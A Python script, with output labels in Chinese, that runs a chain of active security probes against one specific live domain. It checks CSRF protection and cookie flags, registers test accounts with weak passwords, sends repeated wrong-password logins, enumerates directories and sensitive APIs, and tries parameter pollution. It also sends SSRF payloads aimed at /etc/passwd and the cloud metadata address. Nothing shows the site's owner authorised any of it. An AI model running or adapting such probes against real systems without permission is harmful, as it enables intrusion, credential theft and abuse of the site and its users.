import httpx, sys, time, json
sys.stdout.reconfigure(encoding='utf-8')

BASE_URL = 'https://cdcas.suwankj.com'

print("="*80)
print("高级安全测试")
print("="*80)

# 1. CSRF 测试
print("\n【1. CSRF 跨站请求伪造测试】")
print("-"*40)

csrf_endpoints = [
    ('/user/login', 'POST', '登录'),
    ('/user/register', 'POST', '注册'),
    ('/user/profile', 'POST', '修改资料'),
    ('/user/password', 'POST', '修改密码'),
]

for endpoint, method, desc in csrf_endpoints:
    try:
        # 检查是否有CSRF token
        resp = httpx.get(f"{BASE_URL}{endpoint}", timeout=10, verify=False)
        has_token = any(token in resp.text.lower() for token in ['csrf', 'token', '_token', 'nonce'])

        if has_token:
            print(f"  [+] {desc} ({endpoint}): 有CSRF防护")
        else:
            print(f"  [!] {desc} ({endpoint}): 可能缺少CSRF防护")
    except:
        print(f"  [-] {desc}: 测试失败")

# 2. 会话管理测试
print("\n【2. 会话管理测试】")
print("-"*40)

# 检查Cookie安全属性
try:
    resp = httpx.get(f"{BASE_URL}/user/login", timeout=10, verify=False)
    cookies = resp.cookies

    for cookie in cookies:
        print(f"\n  Cookie: {cookie.name}")
        print(f"    Secure: {cookie.secure}")
        print(f"    HttpOnly: {'HttpOnly' in str(cookie._rest)}")
        print(f"    SameSite: {cookie.get_nonstandard_attr('SameSite')}")
        print(f"    Path: {cookie.path}")
        print(f"    Domain: {cookie.domain}")

        if not cookie.secure:
            print(f"    [!] 缺少 Secure 标志")
        if 'HttpOnly' not in str(cookie._rest):
            print(f"    [!] 缺少 HttpOnly 标志")
except Exception as e:
    print(f"  错误: {e}")

# 3. 会话固定攻击测试
print("\n\n【3. 会话固定测试】")
print("-"*40)

try:
    # 登录前获取session
    session1 = httpx.Client(timeout=httpx.Timeout(30.0))
    resp1 = session1.get(f"{BASE_URL}/user/login", timeout=10, verify=False)
    pre_login_cookies = dict(session1.cookies)

    print(f"  登录前 Cookie: {list(pre_login_cookies.keys())}")

    # 检查session ID格式
    for name, value in pre_login_cookies.items():
        if 'session' in name.lower() or 'sid' in name.lower() or 'token' in name.lower():
            print(f"    {name}: {value[:20]}...")

            # 检查是否是安全的随机值
            if len(value) < 16:
                print(f"    [!] Session ID 过短，可能不安全")
            elif value.isdigit():
                print(f"    [!] Session ID 是纯数字，可能可预测")
            else:
                print(f"    [+] Session ID 格式正常")
except Exception as e:
    print(f"  错误: {e}")

# 4. 密码策略测试
print("\n\n【4. 密码策略测试】")
print("-"*40)

weak_passwords = [
    ('123456', '弱密码'),
    ('password', '常见密码'),
    ('admin123', '简单组合'),
    ('abc123', '简单组合'),
]

for password, desc in weak_passwords:
    try:
        # 测试注册接口是否接受弱密码
        resp = httpx.post(f"{BASE_URL}/user/register",
                           data={'username': f'test{int(time.time())}', 'password': password},
                           timeout=10, verify=False)

        if 'success' in resp.text.lower():
            print(f"  [!] {desc} ({password}): 注册成功，密码策略过弱")
        elif '密码' in resp.text and '弱' in resp.text:
            print(f"  [+] {desc} ({password}): 密码策略正常")
        else:
            print(f"  [?] {desc}: 需要人工检查")
    except:
        print(f"  [-] {desc}: 测试失败")

# 5. 暴力破解防护测试
print("\n\n【5. 暴力破解防护测试】")
print("-"*40)

print("  测试登录接口速率限制...")
blocked = False
for i in range(10):
    try:
        resp = httpx.post(f"{BASE_URL}/user/login",
                           data={'username': 'test', 'password': f'wrong{i}'},
                           timeout=5, verify=False)

        if resp.status_code == 429:
            print(f"  [+] 第{i+1}次请求被限制 (429 Too Many Requests)")
            blocked = True
            break
        elif '验证码' in resp.text or 'captcha' in resp.text.lower():
            print(f"  [+] 第{i+1}次请求触发验证码")
            blocked = True
            break
        elif '锁定' in resp.text or 'locked' in resp.text.lower():
            print(f"  [+] 第{i+1}次请求账号被锁定")
            blocked = True
            break
    except:
        pass

if not blocked:
    print(f"  [!] 10次请求后未触发任何防护机制")
    print(f"      可能存在暴力破解风险")

# 6. 目录枚举
print("\n\n【6. 目录枚举】")
print("-"*40)

dirs = [
    'admin', 'api', 'backup', 'config', 'data', 'db',
    'debug', 'dev', 'files', 'images', 'includes',
    'install', 'lib', 'log', 'logs', 'media',
    'private', 'public', 'resources', 'scripts', 'sql',
    'static', 'storage', 'system', 'temp', 'test',
    'tmp', 'upload', 'uploads', 'vendor', 'web',
]

found_dirs = []
for d in dirs:
    try:
        resp = httpx.get(f"{BASE_URL}/{d}/", timeout=5, verify=False, follow_redirects=False)
        if resp.status_code == 200:
            found_dirs.append(d)
        elif resp.status_code == 301 or resp.status_code == 302:
            found_dirs.append(f"{d} (重定向)")
    except:
        pass

if found_dirs:
    print(f"  发现 {len(found_dirs)} 个目录:")
    for d in found_dirs:
        print(f"    - /{d}")
else:
    print(f"  [+] 未发现可枚举目录")

# 7. HTTP 头安全检查
print("\n\n【7. HTTP 头安全检查】")
print("-"*40)

try:
    resp = httpx.get(f"{BASE_URL}/", timeout=10, verify=False)
    headers = resp.headers

    security_headers = {
        'X-Frame-Options': '防点击劫持',
        'X-Content-Type-Options': '防MIME嗅探',
        'X-XSS-Protection': 'XSS防护',
        'Content-Security-Policy': 'CSP策略',
        'Strict-Transport-Security': 'HSTS',
        'Referrer-Policy': '引用策略',
        'Permissions-Policy': '权限策略',
    }

    for header, desc in security_headers.items():
        if header in headers:
            print(f"  [+] {header}: {headers[header][:50]}")
        else:
            print(f"  [!] {header}: 缺失 ({desc})")

    # 检查不安全的头
    unsafe_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
    for header in unsafe_headers:
        if header in headers:
            print(f"  [!] {header}: {headers[header]} (信息泄露)")

except Exception as e:
    print(f"  错误: {e}")

# 8. 敏感接口探测
print("\n\n【8. 敏感接口探测】")
print("-"*40)

sensitive_apis = [
    '/api/v1/users',
    '/api/v1/admin',
    '/api/v1/config',
    '/api/v1/database',
    '/api/v1/settings',
    '/api/v2/users',
    '/service/debug',
    '/service/config',
    '/service/logs',
    '/user/export',
    '/user/import',
    '/admin/export',
    '/admin/backup',
    '/admin/logs',
]

for api in sensitive_apis:
    try:
        resp = httpx.get(f"{BASE_URL}{api}", timeout=5, verify=False, follow_redirects=False)

        if resp.status_code == 200:
            try:
                data = resp.json()
                print(f"  [!] {api}: 返回JSON - {list(data.keys())[:5]}")
            except:
                if len(resp.text) > 100:
                    print(f"  [?] {api}: 返回200 ({len(resp.text)} bytes)")
        elif resp.status_code == 401:
            print(f"  [+] {api}: 需要认证")
        elif resp.status_code == 403:
            print(f"  [+] {api}: 禁止访问")
    except:
        pass

# 9. 参数污染测试
print("\n\n【9. HTTP 参数污染测试】")
print("-"*40)

hpp_payloads = [
    ('id=1&id=2', '参数重复'),
    ('id=1%26id=2', '参数编码'),
    ('id=1;id=2', '参数分隔'),
]

for payload, desc in hpp_payloads:
    try:
        resp = httpx.get(f"{BASE_URL}/course?{payload}", timeout=5, verify=False)
        print(f"  [?] {desc}: 状态码 {resp.status_code}")
    except:
        print(f"  [-] {desc}: 测试失败")

# 10. SSRF 测试
print("\n\n【10. SSRF 服务端请求伪造测试】")
print("-"*40)

ssrf_payloads = [
    ('http://127.0.0.1', '本地回环'),
    ('http://localhost', '本地主机'),
    ('http://169.254.169.254', 'AWS元数据'),
    ('http://[::1]', 'IPv6回环'),
    ('file:///etc/passwd', '文件协议'),
]

# 检查可能的SSRF入口
ssrf_apis = ['/proxy', '/fetch', '/url', '/redirect', '/callback']

for api in ssrf_apis:
    for payload, desc in ssrf_payloads:
        try:
            resp = httpx.get(f"{BASE_URL}{api}?url={payload}", timeout=5, verify=False)
            if resp.status_code == 200 and ('root:' in resp.text or 'localhost' in resp.text):
                print(f"  [!] {api}?url={payload}: 可能存在SSRF!")
                break
        except:
            pass

print("\n" + "="*80)
print("高级测试完成")
print("="*80)
